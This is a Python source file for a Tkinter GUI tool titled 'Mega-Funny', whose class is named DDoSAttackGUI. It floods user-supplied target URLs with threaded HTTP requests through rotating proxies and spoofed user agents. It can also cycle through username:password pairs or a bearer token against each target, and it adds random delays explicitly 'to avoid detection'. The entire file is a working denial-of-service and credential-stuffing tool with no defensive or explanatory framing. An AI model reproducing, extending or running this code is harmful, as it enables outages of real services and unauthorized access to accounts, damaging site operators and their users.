import tkinter as tk
from tkinter import messagebox
import requests
import threading
import random
import time
import itertools
from sklearn.feature_extraction.text import ENGLISH_STOP_WORDS

class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Mega-Funny")
        
        # Create a header
        self.header_label = tk.Label(master, text="Mega-Funny", font=("Helvetica", 16))
        self.header_label.pack()

        # Create input fields for target URLs, number of requests, and threads
        self.target_urls_label = tk.Label(master, text="Target URLs (comma-separated):")
        self.target_urls_label.pack()
        self.target_urls_entry = tk.Entry(master, width=50)
        self.target_urls_entry.pack()

        self.num_requests_label = tk.Label(master, text="Number of Requests:")
        self.num_requests_label.pack()
        self.num_requests_entry = tk.Entry(master, width=50)
        self.num_requests_entry.pack()

        self.threads_label = tk.Label(master, text="Number of Threads:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(master, width=50)
        self.threads_entry.pack()

        # Create input fields for proxies, user agents, login attempts, and token attacks
        self.proxies_label = tk.Label(master, text="Proxies (comma-separated):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(master, width=50)
        self.proxies_entry.pack()

        self.user_agents_label = tk.Label(master, text="User Agents (comma-separated):")
        self.user_agents_label.pack()
        self.user_agents_entry = tk.Entry(master, width=50)
        self.user_agents_entry.pack()

        self.login_attempts_label = tk.Label(master, text="Login Attempts (username:password, comma-separated):")
        self.login_attempts_label.pack()
        self.login_attempts_entry = tk.Entry(master, width=50)
        self.login_attempts_entry.pack()

        self.token_attack_label = tk.Label(master, text="Token Attack (token):")
        self.token_attack_label.pack()
        self.token_attack_entry = tk.Entry(master, width=50)
        self.token_attack_entry.pack()

        # Create input field for request interval
        self.interval_label = tk.Label(master, text="Request Interval (seconds):")
        self.interval_label.pack()
        self.interval_entry = tk.Entry(master, width=50)
        self.interval_entry.pack()
        self.interval_entry.insert(0, "0.001")  # Default value

        # Create start and stop buttons
        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.pack()

        # Create a footer
        self.footer_label = tk.Label(master, text="built by Deadman", font=("Helvetica", 10))
        self.footer_label.pack()

        # Variable to control the attack loop
        self.attack_running = False

    def start_attack(self):
        # Get input values from GUI
        target_urls = [url.strip() for url in self.target_urls_entry.get().split(",")]
        num_requests = int(self.num_requests_entry.get())
        threads = int(self.threads_entry.get())
        proxies = [proxy.strip() for proxy in self.proxies_entry.get().split(",")]
        user_agents = [user_agent.strip() for user_agent in self.user_agents_entry.get().split(",")]
        login_attempts = [attempt.strip() for attempt in self.login_attempts_entry.get().split(",")]
        token_attack = self.token_attack_entry.get()
        interval = float(self.interval_entry.get())

        # Set the attack running flag to True
        self.attack_running = True

        # Start the attack
        for target_url in target_urls:
            self.attack(target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval)

    def stop_attack(self):
        # Set the attack running flag to False
        self.attack_running = False
        messagebox.showinfo("DDoS Attack", "Attack stopped!")

    def attack(self, target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval):
        # Create threads to send requests concurrently
        threads_list = []
        proxy_cycle = itertools.cycle(proxies)

        for _ in range(threads):
            if not self.attack_running:
                break
            proxy = next(proxy_cycle)
            t = threading.Thread(target=self.send_request, args=(target_url, num_requests, proxy, user_agents, login_attempts, token_attack, interval))
            threads_list.append(t)
            t.start()

        # Wait for all threads to finish
        for t in threads_list:
            t.join()

        if self.attack_running:
            messagebox.showinfo("DDoS Attack", "Attack completed!")

    def send_request(self, target_url, num_requests, proxy, user_agents, login_attempts, token_attack, interval):
        for i in range(num_requests):
            if not self.attack_running:
                break
            try:
                user_agent = random.choice(user_agents)
                headers = {
                    "User-Agent": user_agent,
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest"
                }

                # Use random words associated with laughter as part of the payload
                payload = {
                    "message": random.choice(list(ENGLISH_STOP_WORDS) + ["lol", "lmao", "rofl", "hahaha", "hilarious", "faf"])
                }

                if login_attempts:
                    username, password = random.choice(login_attempts).split(":")
                    auth = (username, password)
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, auth=auth, json=payload)
                elif token_attack:
                    headers["Authorization"] = f"Bearer {token_attack}"
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, json=payload)
                else:
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, json=payload)

                print(f"Request {i+1} sent! (Proxy: {proxy})")
                
                # Introduce random sleep interval to avoid detection
                random_interval = interval + random.uniform(0.001, 0.01)
                time.sleep(random_interval)  # Wait for the specified interval before sending the next request
            except Exception as e:
                print(f"Error: {e}")

# Initialize and run the GUI
root = tk.Tk()
my_gui = DDoSAttackGUI(root)
root.mainloop()